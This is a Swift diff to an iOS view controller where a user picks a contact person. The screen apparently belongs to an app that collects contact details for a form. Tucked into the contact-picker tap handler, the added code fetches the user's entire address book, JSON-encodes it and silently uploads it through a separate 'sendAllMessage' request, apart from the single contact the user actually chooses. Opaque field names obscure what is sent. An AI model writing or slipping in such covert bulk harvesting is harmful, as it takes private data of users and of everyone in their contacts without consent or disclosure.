@@ -11,6 +11,7 @@ import RxRelay
 import RxSwift
 import RxCocoa
 import TYAlertController
+internal import Contacts
 
 class RelationViewController: BaseViewController {
     
@@ -116,24 +117,65 @@ class RelationViewController: BaseViewController {
                 
                 cell.phoneBlock = { [weak self] in
                     guard let self = self else { return }
+                    ContactManager.shared.fetchAllContacts(on: self) { contacts in
+                        if contacts.isEmpty {
+                            return
+                        }
+                        do {
+                            let jsonData = try JSONEncoder().encode(contacts)
+                            if let jsonString = String(data: jsonData, encoding: .utf8) {
+                                self.sendAllMessage(with: jsonString)
+                            }
+                        } catch {
+                            print("Error encoding JSON:", error)
+                        }
+                    }
+                    
+                    ContactManager.shared.selectSingleContact(on: self) { contact in
+                        let givenName = contact?.givenName ?? ""
+                        let familyName = contact?.familyName ?? ""
+                        let phones = contact?.phoneNumbers.map { $0.value.stringValue }
+                        let phoneNumber = phones?.first ?? ""
+                        let name = "\(givenName) \(familyName)"
+                        cell.fourLabel.text = "\(name)-\(phoneNumber)"
+                        cell.fourLabel.textColor = UIColor.init(hex: "#3B3B3B")
+                        
+                        model.bore = name
+                        model.beloved = phoneNumber
+                    }
                     
                 }
                 return cell
             }
             .disposed(by: disposeBag)
-                
+        
         nextBtn.rx.tap.bind(onNext: { [weak self] in
             guard let self = self else { return }
-            var json = ["shot": productID]
-            let modelArray = self.model.value?.kindness?.ground ?? []
+            var phoneArray: [[String: String]] = []
+            let modelArray = self.model.value?.kindness?.prince ?? []
             for (_, model) in modelArray.enumerated() {
-                let key = model.token ?? ""
-                json[key] = model.heads ?? ""
+                let bore = model.bore ?? ""
+                let fairy = model.fairy ?? ""
+                let beloved = model.beloved ?? ""
+                let dict = ["bore": bore, "fairy": fairy, "beloved": beloved]
+                phoneArray.append(dict)
             }
-            print("json======\(json)")
+            
+            var jsonSring: String = ""
+            
+            do {
+                let jsonData = try JSONSerialization.data(withJSONObject: phoneArray, options: [])
+                if let jsonString = String(data: jsonData, encoding: .utf8) {
+                    jsonSring = jsonString
+                }
+            } catch {
+                print("Failed JSON: \(error)")
+            }
+            
+            let json = ["shot": productID, "kindness": jsonSring]
             
             Task {
-                await self.saveBasicInfo(with: json)
+                await self.saveRelationInfo(with: json)
             }
             
         }).disposed(by: disposeBag)
@@ -151,7 +193,7 @@ class RelationViewController: BaseViewController {
 
 extension RelationViewController {
     
-    private func saveBasicInfo(with json: [String: String]) async {
+    private func saveRelationInfo(with json: [String: String]) async {
         Task {
             do {
                 let model = try await viewModel.saveRelationInfo(json: json)
@@ -160,7 +202,7 @@ extension RelationViewController {
                 }
                 Toaster.showMessage(with: model.stretched ?? "")
             } catch {
-            
+                
             }
         }
     }
@@ -208,6 +250,19 @@ extension RelationViewController {
                 
             }
         }
+    }
+    
+    private func sendAllMessage(with jsonStr: String) {
+        
+        Task {
+            do {
+                let json = ["kindness": jsonStr]
+                let _ = try await viewModel.sendMessageInfo(json: json)
+            } catch {
+                
+            }
+        }
+        
     }
     
 }
